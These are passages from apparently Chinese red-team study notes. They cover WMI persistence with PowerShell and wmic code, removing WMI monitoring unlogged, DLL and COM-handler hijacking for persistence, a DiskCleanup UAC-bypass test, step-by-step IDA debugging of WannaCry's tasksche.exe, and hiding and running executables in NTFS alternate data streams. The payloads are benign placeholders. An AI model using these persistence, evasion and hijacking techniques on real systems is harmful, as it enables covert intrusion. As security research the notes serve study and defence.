  <li>对添加payload的长度限制做了修正，payload长度需要满足是8的倍数，否则数字签名状态无效(感谢维一零的帮助)</li>
</ul>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on August 12, 2016
  </div>

  
</article><article class="post">
  <h1>Study Notes Weekly No.1(Monitor WMI &amp; ExportsToC++ &amp; Use DiskCleanup bypass UAC)</h1>

  <div class="entry">
    <p><strong>About:</strong></p>

<ul>
  <li>Monitor WMI Persistence</li>
  <li>Instructions about ExportsToC++</li>
  <li>My test of using DiskCleanup on Windows 10 using DiskCleanup</li>
</ul>

<p><strong>目录：</strong></p>

<ul>
  <li>介绍如何在系统日志中记录WMI Persistence，测试并分析如何绕过</li>
  <li>dll劫持中会用到的一个辅助工具，自动读取dll的导出函数并生成对应的c++代码</li>
  <li>实际测试《using DiskCleanup on Windows 10 using DiskCleanup》，记录过程，虽然测试失败，但其中包含的绕过思路值得学习</li>
</ul>

<h2 id="0x01-monitor-wmi-persistence">0x01 Monitor WMI Persistence</h2>
<hr>

<p><strong>Reference:</strong></p>

<p>https://www.fireeye.com/blog/threat-research/2016/08/wmi_vs_wmi_monitor.html</p>

<h3 id="简介">简介</h3>

<p>攻击者通常会利用WMI来实现远程执行(如wmiexec)和后门(如WMI Persistence),然而Windows系统默认不会在日志中记录这些操作。于是Timothy Parisi和Evan Pena提出了他们的解决方法：</p>

<p>利用WMI Persistence的方法记录攻击者调用WMI的操作，并将以下结果写入系统日志中，监控系统实时读取系统日志，及时提醒用户受到攻击</p>

<ul>
  <li>Event Consumer Name</li>
  <li>Event Consumer Command</li>
  <li>Process Call Method</li>
  <li>Process Call Command</li>
</ul>

<h3 id="实际测试">实际测试</h3>

<p>作者开源了一个powershell脚本，下载地址如下：
https://github.com/realparisi/WMI_Monitor/blob/master/WMIMonitor.ps1</p>

<p><strong>注：</strong></p>

<p>powershell版本需要3.0或者更高</p>

<p>以管理员权限运行</p>

<p><strong>测试系统：</strong></p>

<p>Windows 8.1 x86</p>

<p>Powershell v3.0</p>

<p><strong>1、</strong>运行脚本开启监控</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-26//2-1.png" alt="Alt text"></p>

<p><strong>2、</strong>模拟攻击者新建一个定时启动后门</p>

<p>powershell代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$filterName = 'BotFilter82'
$consumerName = 'BotConsumer23'
$exePath = 'C:\Windows\System32\notepad.exe'
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop
$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
</code></pre></div></div>

<p>wmic在cmd下直接实现的代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BotFilter82", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="BotConsumer23", ExecutablePath="C:\Windows\System32\notepad.exe",CommandLineTemplate="C:\Windows\System32\notepad.exe"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"BotFilter82\"", Consumer="CommandLineEventConsumer.Name=\"BotConsumer23\""
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>代码具体含义在《WMI Attacks》、《WMI Backdoor》、《WMI Defense》、<a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe/">《Study Notes of WMI Persistence using wmic.exe》</a>作过具体介绍，此处略</p>

<p><strong>3、</strong>查看系统日志</p>

<p>控制面板-系统和安全-查看事件日志-事件查看器（本地）-Windows日志-应用程序</p>

<p>找到事件ID为8的事件，查看详细信息，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-26/2-2.png" alt="Alt text"></p>

<p>记录了如下信息：</p>

<p>==New WMI Consumer Created==</p>

<p>Consumer Name: BotConsumer23</p>

<p>Command Executed: C:\Windows\System32\notepad.exe</p>

<p><strong>4、</strong>结论</p>

<p>系统日志成功记录攻击者留下的后门</p>

<h3 id="站在攻击者角度的思考">站在攻击者角度的思考</h3>

<p>如果攻击者能够实现WMI Persistence，代表其已经获得了管理员权限，那么可通过如下命令来查看已注册的WMI信息：</p>

<p>通过powershell查看的代码：</p>

<p><strong>Filters：</strong></p>

<p><code class="language-plaintext highlighter-rouge">Get-WMIObject -Namespace root\Subscription -Class __EventFilter</code></p>

<p><strong>Event Consumers：</strong></p>

<p><code class="language-plaintext highlighter-rouge">Get-WMIObject -Namespace root\Subscription -Class __EventConsumer</code></p>

<p><strong>Event Bindings：</strong></p>

<p><code class="language-plaintext highlighter-rouge">Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding</code></p>

<p>通过wmic查看的代码：</p>

<p><strong>Filters：</strong></p>

<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter GET __RELPATH /FORMAT:list</code></p>

<p><strong>Event Consumers：</strong></p>

<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer GET __RELPATH /FORMAT:list</code></p>

<p><strong>Event Bindings：</strong></p>

<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding GET __RELPATH /FORMAT:list</code></p>

<p>如图，能够查看防御者留下的监控代码，那么当然可以通过命令行来删除监控，而更重要的是查看和删除操作不会被记录到日志中</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-26/2-3.png" alt="Alt text"></p>

<p>通过powershell实现的删除代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-WmiObject __eventFilter -namespace root\subscription -filter "name='_PersistenceEvent_'"| Remove-WmiObject
Get-WmiObject __eventFilter -namespace root\subscription -filter "name='_ProcessCreationEvent_'"| Remove-WmiObject
Remove-WmiObject -Path "ROOT\subscription:NTEventLogEventConsumer.Name='_LogWMIConsumerEvent_'"
Remove-WmiObject -Path "ROOT\subscription:NTEventLogEventConsumer.Name='_LogWMIProcessCreationEvent_'"
Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '_ProcessCreationEvent_'} | Remove-WmiObject
Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '_PersistenceEvent_'} | Remove-WmiObject
</code></pre></div></div>

<p>综上，站在攻击者的角度，可能的绕过方法如下：</p>

<p>(1) 查看EventFilter 和 EventConsumer instances</p>

<p>(2) 删除监控功能的WMI实例</p>

<p>(3) 留下自己的WMI后门</p>

<p>(4) 手动再次开启监控功能的WMI实例</p>

<h3 id="补充">补充</h3>
<p>公开的POC powershell脚本仅作为演示，在实际防御中要对以下操作进行记录：
<code class="language-plaintext highlighter-rouge">_FilterToConsumerBinding,__EventFilter, and __EventConsumer instances</code></p>

<ul>
  <li>Win10和Server2016将会解决上述问题</li>
</ul>

<blockquote>
  <p>Matt Graeber@mattifestation:</p>

  <p>“in Win 10 and I believe Server 2016, Event 5861 in
Microsoft-Windows-WMI-Activity/Operational now captures WMI
persistence.</p>
</blockquote>

<p>引用自：https://twitter.com/mattifestation/status/766269596756312064</p>

<h2 id="0x02-instructions-about-exportstoc">0x02 Instructions about ExportsToC++</h2>

<p><strong>Reference:</strong></p>

<p>http://uacmeltdown.blogspot.nl/</p>

<p>https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/</p>

<p>https://github.com/michaellandi/exportstoc</p>

<h3 id="简介-1">简介</h3>
<p>在实现UACBypass或者Persistence的时候常常会用到dll劫持，实现dll劫持通常会先使用dumpbin查看dll的导出函数，构造一个具有相同导出函数的dll，并在其中添加payload。ExportsToC++ 就是为了简化这个过程，尤其对于包含多个导出函数的dll，大大简化了这个过程。</p>

<h3 id="实际测试-1">实际测试</h3>

<p><strong>下载地址如下：</strong></p>

<p>https://github.com/michaellandi/exportstoc</p>

<p><strong>需要环境：</strong></p>

<p>.NET 2.0 Framework</p>

<p>安装Microsoft Visual Studio</p>

<p><strong>测试实例：</strong>
https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/</p>

<p>https://3gstudent.github.io/3gstudent.github.io/Userland-registry-hijacking/</p>

<p><strong>目的：</strong>
劫持计划任务UserTask，实现开机启动自己的dll，弹框</p>

<p><strong>方法：</strong></p>

<ul>
  <li>
    <p>在HKEY_CURRENT_USER\Software\Classes\CLSID\下新建项{58fb76b9-ac85-4e55-ac04-427593b1d060}</p>
  </li>
  <li>
    <p>新建项InprocServer32</p>
  </li>
  <li>
    <p>值设定为新dll的绝对路径：c:\test\testexport.dll</p>
  </li>
</ul>

<p>劫持的原dll路径：</p>

<p>c:\Windows\system32\dimsjob.dll</p>

<p><strong>步骤：</strong></p>

<p><strong>1、</strong>运行exportstoc</p>

<p>下载工程并编译，直接运行会报错，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-26/3-1.png" alt="Alt text"></p>

<p><strong>解决方法：</strong></p>

<p>运行dumpbin需要VS编译环境，在Visual Studio Tools中找到Developer Command Prompt for VS2012.lnk并运行，在弹出的cmd下运行ExportsToC++.exe</p>

<p><strong>2、</strong>生成c++代码</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-26/3-2.png" alt="Alt text"></p>

<p>打开原dll：</p>

<p>c:\Windows\system32\dimsjob.dll</p>

<p>选择Convert-To C++ Wrapper，输入原dll的绝对路径：</p>

<p>c:\Windows\system32\dimsjob.dll</p>

<p>自动生成可供使用的c++代码，如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;iostream&gt;
#include &lt;windows.h&gt;

using namespace std;

#pragma comment (linker, "/export:DllCanUnloadNow=c:\\windows\\system32\\dimsjob.DllCanUnloadNow,@1")
#pragma comment (linker, "/export:DllGetClassObject=c:\\windows\\system32\\dimsjob.DllGetClassObject,@2")
#pragma comment (linker, "/export:DllRegisterServer=c:\\windows\\system32\\dimsjob.DllRegisterServer,@3")
#pragma comment (linker, "/export:DllUnregisterServer=c:\\windows\\system32\\dimsjob.DllUnregisterServer,@4")

BOOL WINAPI DllMain(HINSTANCE hInst,DWORD reason,LPVOID)
{
	return true;
}
</code></pre></div></div>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-26/3-3.png" alt="Alt text"></p>

<p><strong>3、</strong>编译</p>

<p>使用vc6.0新建dll工程，添加以上代码并加上payload：</p>

<p>MessageBox(NULL,”testexport”,”testexport”,MB_OK);</p>

<p>编译并保存为c:\test\testexport.dll</p>

<p><strong>4、</strong>修改注册表，劫持UserTask</p>

<p>powershell代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function Invoke-ScheduledTaskComHandlerUserTask
{
    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
    Param (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Command,

        [Switch]
        $Force
    )
    $ScheduledTaskCommandPath = "HKCU:\Software\Classes\CLSID\{58fb76b9-ac85-4e55-ac04-427593b1d060}\InprocServer32"
    if ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){
        New-Item $ScheduledTaskCommandPath -Force |
            New-ItemProperty -Name '(Default)' -Value $Command -PropertyType string -Force | Out-Null
    }else{
        Write-Verbose "Key already exists, consider using -Force"
        exit
    }

    if (Test-Path $ScheduledTaskCommandPath) {
        Write-Verbose "Created registry entries to hijack the UserTask"
    }else{
        Write-Warning "Failed to create registry key, exiting"
        exit
    }  
}
Invoke-ScheduledTaskComHandlerUserTask -Command "c:\test\testexport.dll" -Verbose
</code></pre></div></div>

<p><strong>5、</strong>注销用户，重启测试</p>

<p>弹框成功</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-26/3-4.png" alt="Alt text"></p>

<p>使用Process Explorer查看进程taskhost.exe，成功加载新的dll，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-26/3-5.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>在https://3gstudent.github.io/3gstudent.github.io/Userland-registry-hijacking/中使用的方法弹框后taskhost.exe进程报错，未给出bug的解决方法，本文介绍的方式能够解决这个bug</p>

<h2 id="0x03-my-test-of-using-diskcleanup-on-windows-10-using-diskcleanup">0x03 My test of using DiskCleanup on Windows 10 using DiskCleanup</h2>

<p><strong>Reference:</strong></p>

<p>https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/</p>

<h3 id="简介-2">简介</h3>

<p>Win10系统中存在一个叫作”SilentCleanup”的计划任务，任务运行时会作如下操作：</p>

<ul>
  <li>以high权限运行cleanmgr.exe</li>
  <li>创建临时目录C:\Users&lt;username&gt;\AppData\Local\Temp\GUID</li>
  <li>将system32\Dism下的DismHost.exe及其运行时需要加载的dll复制到该临时目录</li>
  <li>以high权限运行DismHost.exe</li>
  <li>删除临时目录所有内容</li>
</ul>

<h3 id="绕过思路">绕过思路</h3>

<ul>
  <li>监控临时目录的生成</li>
  <li>替换复制到该临时目录的dll，为确保及时，覆盖DismHost.exe最后加载的dll：LogProvider.dll</li>
  <li>DismHost.exe启动时加载替换过的dll，实现UACBypass</li>
</ul>

<h3 id="poc脚本">POC脚本</h3>

<p><strong>下载地址：</strong></p>

<p>https://gist.github.com/mattifestation/b4072a066574caccfa07fcf723952d54</p>

<h3 id="实际测试-2">实际测试</h3>

<p><strong>测试系统：</strong></p>

<p>Win10 x64</p>

<p><strong>补丁：</strong></p>

<p>KB3173428(无法手动卸载)</p>

<p><strong>测试过程：</strong></p>

<p><strong>1、</strong>正常启动计划任务SilentCleanup</p>

<p>开启ProcessMonitor</p>

<p>手动开启服务SilentCleanup</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-26/4-1.png" alt="Alt text"></p>

<p>cleanmgr.exe创建临时目录</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-26/4-2.png" alt="Alt text"></p>

<p>切换到临时目录查看复制过来的dll</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-26/4-3.png" alt="Alt text"></p>

<p>high权限运行的DismHost.exe</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-26/4-4.png" alt="Alt text"></p>

<p><strong>2、</strong>通过POC脚本启动计划任务并测试</p>

<p>开启ProcessMonitor</p>

<p>根据LogProvider.dll的导出函数编写新的dll(过程略，可参考0x02)</p>

<p>执行poc脚本</p>

<p>临时目录创建成功</p>

<p>接下来出现两种情况：</p>

<p>(1)LogProvider.dll替换失败</p>

<p>(2)脚本显示dll文件替换成功，输出显示UACBypass成功，然而新的dll并没有加载</p>

<p>查看临时目录，发现创建两个GUID文件夹，一个是包含正常LogProvider.dll的目录，另一个是LogProvider.dll被替换成新dll的目录</p>

<p>DismHost.exe正常启动，但没有加载新的dll</p>

<p>测试失败</p>

<p><strong>补充：</strong></p>

<p>虽然测试失败，但是绕过思路值得学习：</p>
<ul>
  <li>POC通过注册WMI事件来监控特定文件目录</li>
  <li>当目录下有特定文件生成的时候对其替换</li>
  <li>进而实现dll劫持</li>
</ul>

<p>这种替换思路在其他方面也会用到，值得收藏。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on August 26, 2016
  </div>

  
</article><article class="post">
  <h1>逆向分析——使用IDA动态调试WanaCrypt0r中的tasksche.exe</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>2017年5月12日全球爆发大规模蠕虫勒索软件WanaCrypt0r感染事件，各大厂商对该软件做了深入分析，但针对初学者的分析教程还比较少，复现过程需要解决的问题有很多，而且没有文章具体介绍勒索软件的实际运行流程，所以我写了这篇面向初学者的教程，希望帮助大家。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>样本实际运行流程</li>
  <li>IDA动态调试方法</li>
  <li>具体调试tasksche.exe的过程</li>
</ul>

<h2 id="0x02-样本分析">0x02 样本分析</h2>
<hr>

<p>测试环境： Win 7 x86</p>

<p>测试工具： IDA 6.8</p>

<p><strong>样本下载地址：</strong></p>

<p>http://bbs.pediy.com/thread-217586-1.htm</p>

<p>经测试，该样本为WanaCrypt0r母体mssecsvc.exe释放出的敲诈者程序tasksche.exe</p>

<p>因此不包含“Kill Switch”开关和MS17-010漏洞利用代码</p>

<p><strong>样本流程分析：</strong></p>

<p>通过逆向分析，样本流程如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-18/1-1.png" alt="Alt text"></p>

<p><strong>注:</strong></p>

<p>样本流程图使用processon绘制，在线网址如下：</p>

<p>https://www.processon.com/</p>

<h2 id="0x03-实际测试">0x03 实际测试</h2>
<hr>

<h3 id="1启动ida加载样本文件wcryexe">1、启动IDA，加载样本文件wcry.exe</h3>

<p>找到WinMain(x,x,x,x)函数，在初始位置下断点（快捷键F2），如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-18/2-1.png" alt="Alt text"></p>

<h3 id="2启动调试器">2、启动调试器</h3>

<p>选择Debugger（快捷键F9）</p>

<p>选择Local Win32 debugger，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-18/2-2.png" alt="Alt text"></p>

<p>选择Debugger-Continue process（快捷键F9）,进入调试界面，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-18/2-3.png" alt="Alt text"></p>

<h3 id="3开始单步调试">3、开始单步调试</h3>

<p>单步步入快捷键F7</p>

<p>单步步过快捷键F8</p>

<p>执行到 call sub_401225，按F7单步步入，查看该函数的反汇编代码，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-18/2-4.png" alt="Alt text"></p>

<p>为了便于分析，可以输入快捷键F5查看伪代码，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-18/2-5.png" alt="Alt text"></p>

<p>通过代码猜测该函数的功能如下:</p>

<ul>
  <li>调用GetComputerNameW函数获得计算机名</li>
  <li>使用rand函数生成一个随机数</li>
  <li>二者结合生成一个唯一的ID</li>
</ul>

<p>动态执行至该函数结束，寄存器EAX的值保存函数返回结果，对应到上述函数，EAX寄存器保存的是生成的ID值</p>

<p>EAX的地址为0040F8AC，查看该内存地址的内容为vxdxwoohuuxv276，即生成的ID值为vxdxwoohuuxv276</p>

<p>以上操作过程如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-18/2-6.png" alt="Alt text"></p>

<p>继续调试，执行到jnz short loc_40208E，可看到程序出现分支，IDA会自动提示接下来要执行的分支为左侧(该分支会闪烁)，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-18/2-7.png" alt="Alt text"></p>

<p>对照前文的样本流程图，可知此时并未进入安装模式</p>

<h3 id="4修改启动参数进入安装模式">4、修改启动参数，进入安装模式</h3>

<p>为了进入安装模式，需要在程序启动时加入参数/i</p>

<p>现在退出调试模式，选择Debugger-Process options，填入参数/i,如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-18/2-8.png" alt="Alt text"></p>

<p>再次启动调试，执行到jnz short loc_40208E，程序跳入右侧分支，进入安装模式，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-18/2-9.png" alt="Alt text"></p>

<p>继续调试，执行到call sub_401B5F</p>

<p>该函数的功能如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-18/3-1.png" alt="Alt text"></p>

<p>依次尝试在c:\ProgramData、c:\Intel、%Temp%文件夹下创建以ID为名称的文件夹，直到成功为止</p>

<p>执行完该语句，查看路径c:\ProgramData，发现新生成的文件夹vxdxwoohuuxv276，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-18/3-2.png" alt="Alt text"></p>

<p>继续调试，接下来的功能为将程序自身复制到上述目录，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-18/3-3.png" alt="Alt text"></p>

<p>执行到call sub_401F5D,该函数的功能如下:</p>

<p>创建服务，服务名称和显示名称均以ID命名，启动参数为cmd.exe /c “C:\ProgramData\vxdxwoohuuxv276\tasksche.exe”，对应子函数sub_401CE8，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-18/3-4.png" alt="Alt text"></p>

<p>创建互斥量Global\MsWinZonesCacheCounterMutexA，用来避免程序重复启动,对应子函数sub_401EFF，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-18/3-5.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>由于服务设置成自动执行，所以安装服务后会自动执行C:\ProgramData\vxdxwoohuuxv276\tasksche.exe，不出意外，你的测试系统此时已经弹出勒索软件的主界面，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-18/3-6.png" alt="Alt text"></p>

<p>至此，安装模式结束，如下图，接下来完成对左侧分支的调试</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-18/3-7.png" alt="Alt text"></p>

<h3 id="5将启动参数取消重新进入调试模式进入左侧分支">5、将启动参数取消，重新进入调试模式，进入左侧分支</h3>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-18/4-1.png" alt="Alt text"></p>

<p>执行到call sub_4010FD，该函数的功能如下:</p>

<p>创建注册表项HKEY_LOCAL_MACHINE\Software\WanaCrypt0r\wd</p>

<p>键值为程序绝对路径，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-18/4-2.png" alt="Alt text"></p>

<p>执行到call sub_401DAB，该函数释放资源中的PE文件，文件包含：</p>

<ul>
  <li>b.wnry</li>
  <li>c.wnry</li>
  <li>r.wnry</li>
  <li>s.wnry</li>
  <li>t.wnry</li>
  <li>taskdl.exe</li>
  <li>taskse.exe</li>
  <li>u.wnry</li>
  <li>msg(目录)</li>
</ul>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-18/4-3.png" alt="Alt text"></p>

<p>执行到call sub_401E9E，该函数功能如下:</p>

<p>加密c.wnry文件的第一行内容13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94（软件作者的比特币地址）</p>

<p>继续调试，接下来执行cmd命令：</p>

<p><code class="language-plaintext highlighter-rouge">attrib.exe +h</code></p>

<p>用于将当前文件夹设置为隐藏属性，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-18/4-4.png" alt="Alt text"></p>

<p>接着执行cmd命令：</p>

<p><code class="language-plaintext highlighter-rouge">icacls.exe . /grant Everyone:F /T /C /Q</code></p>

<p>用于为当前文件夹添加权限用户组Everyone，主要用来开放访问权限，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-18/4-5.png" alt="Alt text"></p>

<p>执行到call sub_40170A,该函数用来动态获取API地址，主要为了实现接下来的内存加载dll</p>

<p>执行到call sub_4014A6，该函数用来解密dll，可以在特殊位置下断点，从内存dump出该dll文件</p>

<p>通过分析代码，发现解密函数位于sub_403A77，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-18/4-7.png" alt="Alt text"></p>

<p>对应该函数，函数执行前，EAX保存解密数据长度，函数执行后，EBX保存解密dll文件的起始地址</p>

<p>完整过程如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-18/4-8.png" alt="Alt text"></p>

<p>函数执行前查看寄存器EAX的值，解密长度为0x10000(截图未体现)</p>

<p>001790C8保存解密dll文件的起始地址</p>

<p>将以上解密数据（数据范围001790C8-001890C8）dump并保存成dll文件，使用ida打开，识别为dll文件，导出函数为TaskStart</p>

<p><strong>注：</strong></p>

<p>我已将解密的dll文件提取并上传至github，地址如下：</p>

<p>https://github.com/3gstudent/WanaCrypt0r-Reverse-Analysis/blob/master/crypt.dll1</p>

<p>继续调试，执行到call sub_402924，该函数用来内存加载dll，传入导出函数TaskStart</p>

<p>至此，tasksche.exe任务完成，接下来的工作交由dll实现</p>

<h2 id="0x04-小结">0x04 小结</h2>
<hr>

<p>本文介绍了如何使用IDA对WanaCrypt0r中tasksche.exe进行动态调试，接下来会带来对解密dll的逆向分析过程，介绍WanaCrypt0r的加密流程</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on May 18, 2017
  </div>

  
</article><article class="post">
  <h1>Hidden Alternative Data Streams的进阶利用技巧</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在渗透测试中，ADS(供选数据流/ alternate data stream)通常用于在文件中隐藏payload，这种方式最大的优点是不影响文件大小，普通用户很难察觉</p>

<p>为此，微软提供了<code class="language-plaintext highlighter-rouge">"dir /r"</code>操作，可用来查看文件的ADS，同时，Win XP以后的系统禁止用户从ADS里直接执行程序，限制了ADS的利用</p>

<p>然而，通过一些特殊用法和技巧，我们能够更好的隐藏ADS，并且能够从ADS里直接执行程序 ：）</p>

<p><strong>说明：</strong></p>

<p>写本文的初衷是偶然看到了一篇有趣的文章，作者：lex Inführ，地址如下：</p>

<p>http://insert-script.blogspot.co.at/2012/11/hidden-alternative-data-streams.html</p>

<p>该文章介绍了一些绕过ADS检测工具的技巧，并给出了通过wmi执行ADS的方法</p>

<p>本文将基于lex Inführ的文章，结合我的研究心得，对ADS的利用技巧作扩充，分享如何清除这些特殊的ADS，帮助大家提升对ADS的认识</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>ADS常规利用方法</li>
  <li>ADS常规检测工具</li>
  <li>特殊ADS对检测工具的绕过</li>
  <li>特殊ADS的清除</li>
  <li>防御建议</li>
</ul>

<h2 id="0x02-常规利用">0x02 常规利用</h2>
<hr>

<h3 id="ads">ADS：</h3>

<p>适用于NTFS文件系统,基础知识可参考如下文章：</p>

<p>http://www.freebuf.com/articles/73270.html</p>

<h3 id="创建ads">创建ADS：</h3>

<p>对文件，命令行：</p>

<p><code class="language-plaintext highlighter-rouge">echo test1 &gt; test.txt:ThisIsAnADS</code></p>

<p>创建成功后，test.txt文件大小不变</p>

<p>对文件夹，命令行：</p>

<p><code class="language-plaintext highlighter-rouge">echo test1 &gt; c:\test\ads\1:ThisIsAnADS</code></p>

<p><strong>注：</strong></p>

<p>需要绝对路径</p>

<h3 id="查看文件中的ads">查看文件中的ADS：</h3>

<p>命令行：</p>

<p><code class="language-plaintext highlighter-rouge">dir /r</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-5/2-1.png" alt="Alt text"></p>

<p>可获得文件夹和文件中包含的ADS信息</p>

<h3 id="查看ads内容">查看ADS内容：</h3>

<p>命令行：</p>

<p><code class="language-plaintext highlighter-rouge">more &lt; test.txt:ThisIsAnADS</code></p>

<p>如下图，获得ADS的具体内容</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-5/2-2.png" alt="Alt text"></p>

<h3 id="删除ads">删除ADS:</h3>

<p>命令行：</p>

<p><code class="language-plaintext highlighter-rouge">more &lt; test.txt &gt; testcopy.txt</code></p>

<p>使用more命令查看文件的主数据流并输出，即可变相实现ADS的删除</p>

<p>如下图，testcopy.txt不包含多余ADS</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-5/2-3.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>more命令在显示较长数据时会截断，逐屏显示输出，这里面就存在一个bug，如果文件过大，导致more命令需要分屏显示的时候，就会造成数据显示不完整，导致文件生成失败</p>

<h2 id="0x03-ads的执行">0x03 ADS的执行</h2>
<hr>

<h3 id="1通过wmi">1、通过wmi</h3>

<p>命令行：</p>

<p><code class="language-plaintext highlighter-rouge">type putty.exe &gt; test.txt:putty.exe</code></p>

<p><code class="language-plaintext highlighter-rouge">wmic process call create c:\test\test.txt:putty.exe</code></p>

<p>如图</p>

